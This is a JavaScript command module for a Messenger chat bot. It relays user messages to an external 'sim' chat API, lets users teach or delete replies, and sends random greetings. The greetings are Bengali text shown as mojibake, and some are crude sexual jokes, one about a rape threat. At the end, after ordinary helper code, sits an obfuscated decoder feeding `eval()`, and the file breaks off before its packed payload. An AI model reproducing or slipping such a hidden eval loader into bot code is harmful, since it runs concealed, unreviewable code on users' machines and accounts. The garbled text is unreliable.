const axios = require('axios');
const fs = require('fs'); 
const path = require('path');

module.exports = {
  config: {
    name: "bot",
    version: "1.0.0",
    permission: 0,
    credits: "nayan",
    description: "talk with bot",
    prefix: 'awto',
    category: "talk",
    usages: "hi",
    cooldowns: 5,
  },

  handleReply: async function ({ api, event }) {
    try {

      const apiData = await axios.get('https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json');
      const apiUrl = apiData.data.sim;
      const kl = await axios.get(`https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json`);
      const apiUrl2 = kl.data.api2;
      const response = await axios.get(`${apiUrl}/sim?type=ask&ask=${encodeURIComponent(event.body)}`);
      console.log(response.data);
      const result = response.data.data.msg;

      const textStyles = loadTextStyles();
      const userStyle = textStyles[event.threadID]?.style; 

      const fontResponse = await axios.get(`${apiUrl2}/bold?text=${result}&type=${userStyle}`);
      const text = fontResponse.data.data.bolded;

      api.sendMessage(text, event.threadID, (error, info) => {
        if (error) {
          console.error('Error replying to user:', error);
          return api.sendMessage('An error occurred while processing your request. Please try again later.', event.threadID, event.messageID);
        }
        global.client.handleReply.push({
          type: 'reply',
          name: this.config.name,
          messageID: info.messageID,
          author: event.senderID,
          head: event.body
        });
      }, event.messageID);

    } catch (error) {
      console.error('Error in handleReply:', error);
      api.sendMessage('An error occurred while processing your request. Please try again later.', event.threadID, event.messageID);
    }
  },

  start: async function ({ nayan, events, args, Users }) {
    try {
      const msg = args.join(" ");
      const apiData = await axios.get('https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json');
      const apiUrl = apiData.data.sim;


      if (!msg) {
        const greetings = [
          "-ржЖрж╣ рж╢рзБржирж╛ ржЖржорж╛рж░ рждрзЛржорж╛рж░ ржЕрж▓рж┐рждрзЗ ржЧрж▓рж┐рждрзЗ ржЙржорзНржорж╛рж╣ ЁЯШЗЁЯШШ",
  "-рж╕рзБржирзНржжрж░ ржорж╛ржЗрзЯрж╛ ржорж╛ржирзЗржЗ-ЁЯе▒-ржЖржорж╛рж░ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржПрж░ ржмржЙ-ЁЯШ╜ЁЯл╢-ржЖрж░ ржмрж╛ржХрж┐ ржЧрзБрж▓рзЛ ржЖржорж╛рж░ ржмрзЗржпрж╝рж╛ржЗржи-ЁЯЩИЁЯР╕ЁЯдЧ",
  "-ржХрж┐рж░рзЗ-ЁЯл╡-рждрж░рж╛ ржирж╛ржХрж┐  prem ржХрж░рж╕-ЁЯШРЁЯР╕-ржЖржорж╛рж░рзЗ ржПржХржЯрж╛ ржХрж░рж╛ржЗ ржжрж┐рж▓рзЗ ржХрж┐ рж╣ржпрж╝-ЁЯе║",
  "Bot ржмрж▓рзЗ ржЕрж╕ржорзНржорж╛ржи ржХрж░ржЪрзНржЫрж┐ржЫ,ЁЯШ░ЁЯШ┐",
  "-рж╣рзБржжрж╛ржЗ ржЖржорж╛рж░рзЗ  рж╢рзЯрждрж╛ржирзЗ рж▓рж╛рж░рзЗ-ЁЯШЭЁЯШСтШ╣я╕П",
  "- ржмрзЗржбрж┐ ржорж╛ржирзБрж╖ ржмрзЬ ржнрзЗржЬрж╛ржЗрж▓рзНрж▓рж╛ЁЯдзЁЯФк",
  "тОпрждрзЛрзНржБрж░рзНржБ ржирзНржБржЬрзНржБрж░рзЗрзНржБ рж╕рзНржБржорзНржБрж╕рзНржпрж╛рзНржБ ржЖрзНржБржЫрзЗрзНржБ  ржирзНржБржЬрзНржБрж░рзНржБ ржарж┐рзНржБржХрзНржБ ржХрзНржБрж░рзНржБ-ЁЯР╕ЁЯлгтОптГЭ''",
  "-ржЪрзБрзНржБржкрзНржБ ржерж╛рзНржБржХрзНржБ рждрзБрзНржБржЗрзНржБ ЁЯл╡ ржмрж┐рзНржБржЫрж╛рзНржБржирж╛рзНржБржпрж╝рзНржБ ржорзБрзНржБрждрзЛрзНржБрж╕рзНржБ ЁЯШ╜тОп═втОптГЭЁЯй╖ЁЯНТЁЯЩВ",
  "___ржоржи ржжрзЗ !ЁЯЩВЁЯл┤---ржЫрж┐ржирж┐ ржорж┐ржирж┐ ржЦрзЗрж▓ржорзБ ЁЯднЁЯдн",
  "- ржУржЗ ЁЯл╡ рждрзЛржорж╛рж░рзЗ ржкрзНрж░ржЪрзБрж░ ржнрж╛рж▓рзНрж▓рж╛ржЧрзЗ-ЁЯШ╜-рж╕ржорзЯ ржорждрзЛ ржкрзНрж░ржкрзЛржЬ ржХрж░ржорзБ ржмрзБржЭржЫрзЛ-ЁЯФиЁЯШ╝-ржЫрж┐ржЯ ржЦрж╛рж▓рж┐ рж░рж╛ржЗржЦрзЛ- ЁЯе▒ЁЯР╕ЁЯе╡",
  "-ржЖржкржирж╛рж░ рж╕рзБржирзНржжрж░рзА ржмрж╛ржирзНржзрзБржмрзАржХрзЗ ржлрж┐рждрж░рж╛ рж╣рж┐рж╕рзЗржмрзЗ ржЖржорж╛рж░ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржХрзЗ ржжрж╛ржи ржХрж░рзЗржи-ЁЯе▒ЁЯР░ЁЯНТ",
  "-ржЗрж╕ ржХрзЗржЙ ржпржжрж┐ ржмрж▓рждрзЛ-ЁЯЩВ-ржЖржорж╛рж░ рж╢рзБржзрзБ  рждрзЛржорж╛ржХрзЗржЗ рж▓рж╛ржЧржмрзЗ-ЁЯТЬЁЯМ╕",
  "-ржЕржирзБржорждрж┐ ржжрж┐рж▓рж╛ржо-ЁЭЩЛЁЭЩзЁЭЩдЁЭЩеЁЭЩдЁЭЩиЁЭЩЪ ржХрж░ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржХрзЗ-ЁЯР╕ЁЯШ╛ЁЯФк",
  "-ржкрзНрж░рж┐рзЯ-ЁЯе║ -рждрзЛржорж╛ржХрзЗ ржирж╛ ржкрзЗрж▓рзЗ ржЖржорж┐ рж╕рждрзНржпрж┐-ЁЯШк -ржЖрж░рзЗржХржЬржи ржХрзЗ-ЁЯШ╝ -ржкржЯрж╛рждрзЗ ржмрж╛ржзрзНржп рж╣ржмрзЛ-ЁЯШСЁЯдз",
  "- ржжрзБржирж┐рзЯрж╛рж░ рж╕ржмрж╛ржЗ ржкрзНрж░рзЗржо ржХрж░рзЗ.!ЁЯдз -ржЖрж░ ржорж╛ржирзБрж╖ ржЖржорж╛рж░ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржХрзЗ рж╕ржирзНржжрзЗрж╣ ржХрж░рзЗ.!ЁЯР╕",
  "-рждрзЛрж░ ржХржерж╛ рждрзЛрж░ ржмрж╛ржбрж╝рж┐ ржХрзЗржЙ рж╢рзБржирзЗ ржирж╛ рждрзЛ ржЖржорж┐ ржХрзЛржирзЛ рж╢рзБржиржмрзЛ__ЁЯдФЁЯШВ",
  "тАФржпрж╛рж░рзЗ ржжрзЗрж╣рж┐ рждрж╛рж░рзЗржЗ ржнрж╛рж▓рзНрж▓рж╛ржЧрзЗ..!ЁЯЩИ- ржоржирзЗ рж╣рзЯ рж░рзБржЪрж┐ ржмрж╛рзЬржЫрзЗ..!ЁЯШАЁЯШЛ рждрзБржорж┐ ржХрж┐ ржжрзЗржЦрзЛ рждрзЛржорж╛ржХрзЗржУ рждрзЛ  ржнрж╛рж▓рзНрж▓рж╛ржЧрзЗ - ЁЯШйЁЯлвЁЯлг",
  "-ржмрзБржХрзЗрж░ ржмрж╛ржо ржкрж╛рж╢рзЗ ржПрж╕рж┐ рж╕рж╣ ржПржХржЯрж╛ ржлрзНрж▓рж╛ржЯ ржЦрж╛рж▓рж┐ ржЖржЫрзЗ...ржПржХржЬржи ржмрж┐рж╢рзНржмрж╕рзНржд ржнрж╛рзЬрж╛ржЯрж┐рзЯрж╛ ржЪрж╛ржЗЁЯШК...!ЁЯЩИЁЯСА",
  "-ржПржХржжрж┐ржи ржарж╛рж╕ ржХрж░рзЗЁЯШОЁЯФк ржХрж┐ржЙржЯ рж╣рзЯрзЗ ржпрж╛ржорзБ_ЁЯШй рждрж╛рж░ржкрж░ рждрзЛржЧрзЛрж░рзЗ  ржЖрж░ ржкрж╛рждрзНрждрж╛ ржжрж┐ржорзБ ржирж╛ __ЁЯР╕ЁЯМЪЁЯЩВ",
  "-ржнрж╛ржЗ рждрзБржЗ ржПржХржЯрзБ ржЖржорж╛рж░ ржХрж╛ржЫрзЗ ржЖржЗ рждрж░рзЗ ржорж╛ржЗрж░рж╛ ржЖржорж┐ ржШрзБржорж╛ржорзБ_ЁЯСКЁЯШ┤",
  "-ржПржЗ ржЖржирзНржЯрж┐рж░ ржорзЗрзЯрзЗ-ЁЯлвЁЯЩИ-ЁЭРФЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРжЁЭРЪЁЭРб-ЁЯШ╜ЁЯл╢-ржЖрж╕рж▓рзЗржЗ рждрзЛ рж╕рзНржмрж╛ржж-ЁЯе╡ЁЯТж-ржПрждрзЛ рж╕рзНржмрж╛ржж ржХрзЗржи-ЁЯдФ-рж╕рзЗржЗ рж╕рзНржмрж╛ржж-ЁЯШЛ",
  "-ржЪрзБржорзБ ржерж╛ржХрждрзЗ рждрзЛрж░рж╛ ржмрж┐рзЬрж┐ ржЦрж╛рж╕ ржХрзЗржи ржмрзБржЭрж╛ ржЖржорж╛рж░рзЗ-ЁЯШСЁЯШТЁЯР╕тЪТя╕П",
  "- рж╕рж╛ржирж┐рж▓рж┐ржУржи  ржЖржлрж╛рж░рзЗ ржзрж░рзНрж╖ржирзЗрж░ рж╣рзБржоржХрж┐ ржжрж┐рзЯрзЗ ржЖрж╕рж▓рж╛ржо - ЁЯдЧ -ржЖрж░ ЁЯл╡рждрзБржорж┐ ржпрж╛ржорж╛рж░рзЗ ржЦрзЗрзЯрзЗ ржжрж┐ржмрж╛ рж╕рзЗржЗ ржнрзЯ ржжрзЗржЦрж╛ржУ ржиржирж╕рзЗржи ржмрзЗржбрж┐..!ЁЯе▒ЁЯШ╝",
  "--ржирж╛ржЯржХ ржХржо ржХрж░рзЛ ржкрзНрж░рж┐рзЯ рждрзБржорж┐ ржпрзЗ ржЕржирзНржп ржЬржирзЗ ржЖрж╕ржХрзНржд рждрж╛ рждрзЛржорж╛рж░ ржмрзНржпржмрж╣рж╛рж░рзЗржЗ ржмрзБржЭрж╛ ржпрж╛рзЯ ржкрзНрж░рж┐рзЯ__ЁЯШТЁЯжЛ",
  "__ржмрзЬ ржЖрж░ рж╣ржЗрж▓рж╛ржо ржХржЗ, ржПржЦржирзЛ \n\n-ржЖржХрж╛рж╢ ржжрж┐рзЯрзЗ рж╣рзЗрж▓рж┐ржХржкрзНржЯрж╛рж░ ржЧрзЗрж▓рзЗ рждрж╛ржХрж╛ржЗ ржерж╛ржХрж╛ ржЖржорж┐...! ЁЯМ╗ЁЯЩВ",
  "-ржЖржорж╛ржХрзЗ ржПржд ржбрж╛ржХржЫрзЗржи ржХрзЗржи ржЖржкржирж╛рж░ ржХрж┐ ржЪрж░рж┐рждрзНрж░рзЗрж░ рж╕ржорж╕рзНржпрж╛ ржЖржЫрзЗ-ЁЯдиЁЯднЁЯШ╝",
  "-ЁЭЧЬ ЁЭЧЯЁЭЧвЁЭЧйЁЭЧв ЁЭЧмЁЭЧвЁЭЧи-ЁЯШ╜-ржЖрж╣рж╛рж░рзЗ ржнрж╛ржмржЫрзЛ рждрзЛржорж╛рж░рзЗ ржкрзНрж░рзЗрж╛ржкржЬ ржХрж░ржЫрж┐-ЁЯе┤-ржерж╛ржкрзНржкрж░ ржжрж┐рзЯрж╛ ржХрж┐ржбржирзА рж▓ржХ ржХрж░рзЗ ржжрж┐ржм-ЁЯШТ-ржнрзБрж▓ ржкрзЬрж╛ ржмрзЗрж░ ржХрж░рзЗ ржжрж┐ржмрзЛ-ЁЯднЁЯР╕",
  "ржЬрж╛ржи рждрзЛржорж╛рж░ ржирж╛ржирж┐'рж░рзЗ ржЖржорж╛рж░ рж╣рж╛рждрзЗ рждрзБрж▓рзЗ ржжрж┐ржмрж╛-ЁЯЩКЁЯЩЖтАНтЩВ",
  "-ржЖржорж┐ ржПржХржЯрж╛ ржжрзБржзрзЗрж░ рж╢рж┐рж╢рзБ-ЁЯШЗ-ЁЯл╡ЁЭЧмЁЭЧвЁЭЧиЁЯР╕ЁЯТж",
  "-ржирж╛ржЯржХ ржХржо ржХрж░рзЛ ржкрж┐ржУ-ЁЯЩГ-рждрзБржорж┐ ржпрзЗ ржЕржирзНржп ржЬржирзЗрж░ pream ржП ржЖрж╕ржХрзНржд..! рж╕рзЗржЯрж╛ рждрзЛржорж╛рж░ ржмрзНржпрж╛ржмрж╣рж╛рж░ ржжрзЗржЦрзЗржЗ ржмрзБржЬрж╛ ржпрж╛рзЯ ржкрж┐ржУ..! ЁЯР╕ЁЯСНЁЯП╛",
  "ржЪрзБржирж╛ ржУ ржЪрзБржирж╛ ржЖржорж╛рж░ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржПрж░ рж╣ржмрзБ ржмржЙ рж░рзЗ ржХрзЗржУ ржжрзЗржХржЫрзЛ ржЦрзБржЬрзЗ ржкрж╛ржЪрзНржЫрж┐ ржирж╛-ЁЯШкЁЯдзЁЯШн",
  "-ржЬрж╛ржи рждрзБржорж┐ рж╢рзБржзрзБ ржЖржорж╛рж░ ржЖржорж┐ рждрзЛржорж╛рж░рзЗ рзйрзмрзл ржжрж┐ржи ржнрж╛рж▓рзЛржмрж╛рж╕рж┐-ЁЯТЭЁЯМ║ЁЯШ╜",
  "- ржЭрж╛ржВ ЁЯл╡ ржерзБржорж╛рж▓рзЗ рзЯрж╛ржорж┐ рж░рж╛ржЗрждрзЗ ржкрж╛рж▓рзБржкрж╛рж╕рж┐ ржЙржорзНржоржорзНржорж╛рж╣-ЁЯМ║ЁЯддЁЯТж",
  "-рж╢рзБржиржмрзЛ ржирж╛ ЁЯШ╝ рждрзБржорж┐ ржЖржорж╛ржХрзЗ ржкрзНрж░рзЗржо ржХрж░рж╛ржЗ ржжрж╛ржУ ржирж┐ ЁЯе║ ржкржЪрж╛ рждрзБржорж┐ ЁЯе║",
  "-ЁЭЩВЁЭЩЦЁЭЩоЁЭЩЪЁЭЩи-ЁЯдЧ-ржпрзМржмржирзЗрж░ ржХрж╕ржо ржжрж┐рзЯрзЗ ржЖржорж╛рж░рзЗ ЁЭРБЁЭРеЁЭРЪЁЭРЬЁЭРдЁЭРжЁЭРЪЁЭРвЁЭРе ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ-ЁЯе▓ЁЯджтАНтЩВя╕ПЁЯдз",
  "-ржЖржЬржХрзЗ ржЖржорж╛рж░ ржоржи ржнрж╛рж▓рзЛ ржирзЗржЗ рждрж╛ржЗ ржЖржорж╛рж░рзЗ ржбрж╛ржХржмрзЗржи ржирж╛-ЁЯШкЁЯдз",
  "ржЖржорж┐ ржПржЦржи ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржПрж░ рж╕рж╛ржерзЗ ржмрж┐ржЬрж┐ ржЖржЫрж┐ ржЖржорж╛ржХрзЗ ржбрж╛ржХржмрзЗржи ржирж╛-ЁЯШХЁЯШП ржзржирзНржпржмрж╛ржж-ЁЯдЭЁЯМ╗",
  "-ржЖржЬ ржПржХржЯрж╛ ржмрж┐ржи ржирзЗржЗ ржмрж▓рзЗ ржлрзЗрж╕ржмрзБржХрзЗрж░ ржирж╛ржЧрж┐ржи-ЁЯдз-ржЧрзБрж▓рзЛрж░рзЗ ржЖржорж╛рж░ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржзрж░рждрзЗ ржкрж╛рж░ржЫрзЗ ржирж╛-ЁЯР╕ЁЯе▓",
  "ржЖрж╣ рж╢рзЛржирж╛ ржЖржорж╛рж░ ржЖржорж╛ржХрзЗ ржПрждрзЛ ржбрж╛ржХрзНрждрж╛ржЫрзЛ ржХрзЗржирзЛ ржЖрж╕рзЛ ржмрзБржХрзЗ ржЖрж╢рзЛ-ЁЯе▒ЁЯШШ",
  "-рж╣рзБржо ржЬрж╛ржи рждрзЛржорж╛рж░ ржЕржЗржЦрж╛ржирзЗ ржЙржорзНржоржорж╛рж╣-ЁЯШ╖ЁЯШШ",
  "тАФржпрзЗ ржЫрзЗрзЬрзЗ ржЧрзЗржЫрзЗ-ЁЯШФ-рждрж╛ржХрзЗ ржнрзБрж▓рзЗ ржпрж╛ржУ-ЁЯЩВ-ржЖржорж╛рж░ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржПрж░ рж╕рж╛ржерзЗ  ржкрзНрж░рзЗржо ржХрж░рзЗ рждрж╛ржХрзЗ ржжрзЗржЦрж┐рзЯрзЗ ржжрж╛ржУ-ЁЯЩИЁЯР╕ЁЯдЧ",
  "-ржЖржирзНржЯрж┐-ЁЯЩЖ-ржЖржкржирж╛рж░ ржорзЗржпрж╝рзЗ-ЁЯС░тАНтЩАя╕П-рж░рж╛рждрзЗ ржЖржорж╛рж░рзЗ ржнрж┐ржжрзБ ржХрж▓ ржжрж┐рждрзЗ ржмрж▓рзЗЁЯлг-ЁЯе╡ЁЯддЁЯТж",
  "-рж╢ржЦрзЗрж░ ржирж╛рж░рзА  ржмрж┐ржЫрж╛ржирж╛ржпрж╝ ржорзБ'рждрзЗ..!ЁЯЩГЁЯе┤",
  "-ржПржЗ'ржирзЗржУЁЯФСржЪрж╛ржмрзА ЁЯШТЁЭШкЁЭШпЁЭШгЁЭШ░ЁЭШ╣-ржПрж░ ЁЯФРрждрж╛рж▓рж╛ ржЦрзБрж▓рзЗ ржорзЗржЫрзЗржЬ ржжрзЗржУЁЯУеЁЯлаЁЯдЧ ЁЭРИ ЁЭРЪЁЭРж ЁЭРТЁЭРвЁЭРзЁЭРаЁЭРеЁЭРЮ ЁЯЩВ",
  "ржЖржорж┐ ржЧрж░рзАржм ржПрж░ рж╕рж╛ржерзЗ ржХржерж╛ ржмрж▓рж┐ ржирж╛-ЁЯШ╝ЁЯШ╝",
  "-ржУржЗ ржмрзЗржбрж┐ рждрзЛржорж╛рж░ ржмрж╛рж╕рж╛рзЯ ржирж╛ ржЖржорж╛рж░ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржорзЗрзЯрзЗ ржжрзЗржЦрждрзЗ ржЧрзЗржЫрж┐рж▓рзЛ-ЁЯЩГ-ржирж╛рж╕рзНрждрж╛ ржЖржирж╛рж░рж╕ ржЖрж░ ржжрзБржз ржжрж┐ржЫрзЛ-ЁЯЩДЁЯджтАНтЩВя╕П-ржмржЗржи ржХржЗрж▓рзЗржЗ рждрзЛ рж╣рзЯ ржмрзЯржлрзНрж░рзЗржирзНржб ржЖржЫрзЗ-ЁЯе║ЁЯджтАНтЩВ-ржЖржорж╛рж░ ржмрж╕ ЁЭРЕЁЭРАЁЭРЗЁЭРИЁЭРМ ЁЭРВЁЭРЗЁЭРОЁЭРЦЁЭРГЁЭРЗЁЭРФЁЭРСЁЭРШ ржХрзЗ ржЬрж╛ржирзЗ ржорж╛рж░рж╛рж░ ржХрж┐ ржжрж░ржХрж╛рж░-ЁЯЩДЁЯдз",
  "-ржЖрж╕рж╕рж╛рж▓рж╛ржорзБ ржЖрж▓рж╛ржЗржХрзБржо ржмрж▓рзЗржи ржЖржкржирж╛рж░ ржЬржирзНржп ржХрж┐ ржХрж░рждрзЗ ржкрж╛рж░рж┐-ЁЯдЧ",
  "-ЁЭЪШЁЭРвЁЭРв-ржЗрждрзНрждрзБ ЁЯдП ржнрж╛рж▓рзБтАЩржкрж╛рж╕рж╛ ржжрж┐ржмрж╛-ЁЯлгЁЯе║ЁЯР╝",
  "-ржЬрж╛ржи ржорзЗржпрж╝рзЗ рж╣рж▓рзЗ ржЪрж┐ржкрж╛ржпрж╝ ржЖрж╕рзЛ ржЗржЙржЯрж┐ржЙржм ржерзЗржХрзЗ ржЕржирзЗржХ ржнрж╛рж▓рзЛржмрж╛рж╕рж╛ рж╢рж┐ржЦржЫрж┐ рждрзЛржорж╛рж░ ржЬржирзНржп-ЁЯЩКЁЯЩИЁЯШ╜",
  "-ржЖржорж╛ржХрзЗ ржПрждрзЛ ржирж╛ ржбрзЗржХржЫ ржХрзЗржи ржнрж▓рзЛ ржЯрж╛рж▓рзЛ ржмрж╛рж╕рзЛ ржирж╛ржХрж┐ЁЯднЁЯЩИ",
  "-ржЖржЬржХрзЗ ржкрзНрж░ржкрзЛржЬ ржХрж░рзЗ ржжрзЗржЦрзЛ рж░рж╛ржЬрж┐ рж╣ржЗрзЯрж╛ ржпрж╛ржорзБ-ЁЯШМЁЯдЧЁЯШЗ",
  "-ржмрж╛рж▓рж┐ржХрж╛тФБЁЯС╕-ЁЭРГЁЭРи ЁЭР▓ЁЭРиЁЭРо-ЁЯл╡-ржмрж┐рзЯрж╛-ЁЭРжЁЭРЮ-ЁЯШ╜-ржЖржорж┐ рждрзЛржорж╛ржХрзЗ-ЁЯШ╗-ржЖржорзНржорзБ рж╣ржЗрждрзЗ рж╕рж╛рж╣рж╛ржпрзНржп ржХрж░ржм-ЁЯЩИЁЯе▒",
  "-ржЖрж░ ржХржд ржмрж╛рж░ ржбрж╛ржХржмрж┐ ,рж╢рзБржиржЫрж┐ рждрзЛ,ЁЯднЁЯЩИ",
  "-ржЖржорж╛ржХрзЗ ржПрждрзЛ ржирж╛ ржбрзЗржХрзЗ ржмрж╕ ЁЭЧаЁЭЧ╝ЁЭЧ┐ЁЭШАЁЭЧ╡ЁЭЧШЁЭЧ▒ ржХрзЗ ржПржХржЯрж╛ ржЧржл ржжрзЗ-ЁЯЩДЁЯШМ",
  "-ржЖрж░рзЗ Bolo ржЖржорж╛рж░ ржЬрж╛ржи ,ржХрзЗржоржи ржЖржЫрзЛ?-ЁЯШЪЁЯШН ",
  "-рж╣рзНржпрж╛ржБ ржЬрж╛ржирзБ , ржПржЗржжрж┐ржХ ржП ржЖрж╕рзЛ ржХрж┐рж╕ ржжрзЗржЗ ЁЯднЁЯТЛ"
        ];
        const name = await Users.getNameUser(events.senderID);
        const rand = greetings[Math.floor(Math.random() * greetings.length)];
        return nayan.reply({
          body: `${name}, ${rand}`,
          mentions: [{ tag: name, id: events.senderID }]
        }, events.threadID, (error, info) => {
          if (error) {
            return nayan.reply('An error occurred while processing your request. Please try again later.', events.threadID, events.messageID);
          }

          global.client.handleReply.push({
            type: 'reply',
            name: this.config.name,
            messageID: info.messageID,
            author: events.senderID,
            head: msg,
          });
        }, events.messageID);
      }

      else if (msg.startsWith("textType")) {
        const selectedStyle = msg.split(" ")[1];
        const options = ['serif', 'sans', 'italic', 'italic-sans', 'medieval', 'normal'];

        if (options.includes(selectedStyle)) {
          saveTextStyle(events.threadID, selectedStyle);
          return nayan.reply({ body: `Text type set to "${selectedStyle}" successfully!` }, events.threadID, events.messageID);
        } else {
          return nayan.reply({ body: `Invalid text type! Please choose from: ${options.join(", ")}` }, events.threadID, events.messageID);
        }
      }

      else if (msg.startsWith("delete")) {
        const deleteParams = msg.replace("delete", "").trim().split("&");
        const question = deleteParams[0].replace("ask=", "").trim();
        const answer = deleteParams[1].replace("ans=", "").trim();

        
        const data = await deleteEntry(question, answer, events, apiUrl);
        const replyMessage = data.msg || data.data.msg;

        return nayan.reply({ body: replyMessage }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("info")) {
        const response = await axios.get(`${apiUrl}/sim?type=info`);
        const totalAsk = response.data.data.totalKeys;
        const totalAns = response.data.data.totalResponses;

        return nayan.reply({ body: `Total Ask: ${totalAsk}\nTotal Answer: ${totalAns}` }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("teach")) {
        const teachParams = msg.replace("teach", "").trim().split("&");
        const question = teachParams[0].replace("ask=", "").trim();
        const answer = teachParams[1].replace("ans=", "").trim();

        const response = await axios.get(`${apiUrl}/sim?type=teach&ask=${encodeURIComponent(question)}&ans=${encodeURIComponent(answer)}`);
        const replyMessage = response.data.msg;
        const ask = response.data.data.ask;
        const ans = response.data.data.ans;

        if (replyMessage.includes("already")) {
          return nayan.reply(`ЁЯУЭYour Data Already Added To Database\n1я╕ПтГгASK: ${ask}\n2я╕ПтГгANS: ${ans}`, events.threadID, events.messageID);
        }

        return nayan.reply({ body: `ЁЯУЭYour Data Added To Database Successfully\n1я╕ПтГгASK: ${ask}\n2я╕ПтГгANS: ${ans}` }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("askinfo")) {
        const question = msg.replace("askinfo", "").trim();

        if (!question) {
          return nayan.reply('Please provide a question to get information about.', events.threadID, events.messageID);
        }

        const response = await axios.get(`${apiUrl}/sim?type=keyinfo&ask=${encodeURIComponent(question)}`);
        const replyData = response.data.data;
        const answers = replyData.answers;

        if (!answers || answers.length === 0) {
          return nayan.reply(`No information available for the question: "${question}"`, events.threadID, events.messageID);
        }

        const replyMessage = `Info for "${question}":\n\n` +
          answers.map((answer, index) => `ЁЯУМ ${index + 1}. ${answer}`).join("\n") +
          `\n\nTotal answers: ${answers.length}`;

        return nayan.reply({ body: replyMessage }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("help")) {
        const cmd = this.config.name;
        const prefix = global.config.PREFIX;
        const helpMessage = `
        ЁЯМЯ **Available Commands:**

        1. ЁЯдЦ ${prefix}${cmd} askinfo [question]: Get information about a specific question.

        2. ЁЯУЪ ${prefix}${cmd} teach ask=[question]&ans=[answer]: Teach the bot a new question and answer pair.

        3. тЭМ ${prefix}${cmd} delete ask=[question]&ans=[answer]: Delete a specific question and answer pair. (Admin only)

        4. ЁЯУК ${prefix}${cmd} info: Get the total number of questions and answers.

        5. ЁЯСЛ ${prefix}${cmd} hi: Send a random greeting.

        6. ЁЯОи ${prefix}${cmd} textType [type]: Set the text type (options: serif, sans, italic, italic-sans, medieval, normal).

        тЪб Use these commands to interact with the bot effectively!
            `;

        return nayan.reply({ body: helpMessage }, events.threadID, events.messageID);
      } 

      else {
        const response = await axios.get(`${apiUrl}/sim?type=ask&ask=${encodeURIComponent(msg)}`);
        const replyMessage = response.data.data.msg;

        const textStyles = loadTextStyles();
        const userStyle = textStyles[events.threadID]?.style || 'normal';

        const kl = await axios.get(`https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json`);
        const apiUrl2 = kl.data.api2;

        const font = await axios.get(`${apiUrl2}/bold?text=${replyMessage}&type=${userStyle}`);
        const styledText = font.data.data.bolded;

        nayan.reply({ body: styledText }, events.threadID, (error, info) => {
          if (error) {
            return nayan.reply('An error occurred while processing your request. Please try again later.', events.threadID, events.messageID);
          }

          global.client.handleReply.push({
            type: 'reply',
            name: this.config.name,
            messageID: info.messageID,
            author: events.senderID,
            head: msg,
          });
        }, events.messageID);
      }
    } catch (error) {
      console.log(error);
      nayan.reply('An error has occurred, please try again later.', events.threadID, events.messageID);
    }
}
}


function loadTextStyles() {
  const Path = path.join(__dirname, 'system', 'textStyles.json');
  try {

    if (!fs.existsSync(Path)) {
      fs.writeFileSync(Path, JSON.stringify({}, null, 2));
    }

    
    const data = fs.readFileSync(Path, 'utf8');
    return JSON.parse(data);  
  } catch (error) {
    console.error('Error loading text styles:', error);
    return {}; 
  }
}

function saveTextStyle(threadID, style) {

  const styles = loadTextStyles(); 


  styles[threadID] = { style }; 

  const Path = path.join(__dirname, 'system', 'textStyles.json');
  try {

    fs.writeFileSync(Path, JSON.stringify(styles, null, 2));
  } catch (error) {
    console.error('Error saving text styles:', error);
  }
}




var _0xc34e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe65c(d,e,f){var g=_0xc34e[2][_0xc34e[1]](_0xc34e[0]);var h=g[_0xc34e[3]](0,e);var i=g[_0xc34e[3]](0,f);var j=d[_0xc34e[1]](_0xc34e[0])[_0xc34e[10]]()[_0xc34e[9]](function(a,b,c){if(h[_0xc34e[4]](b)!==-1)return a+=h[_0xc34e[4]](b)*(Math[_0xc34e[8]](e,c))},0);var k=_0xc34e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc34e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe65c(s,e,10)-t)}return 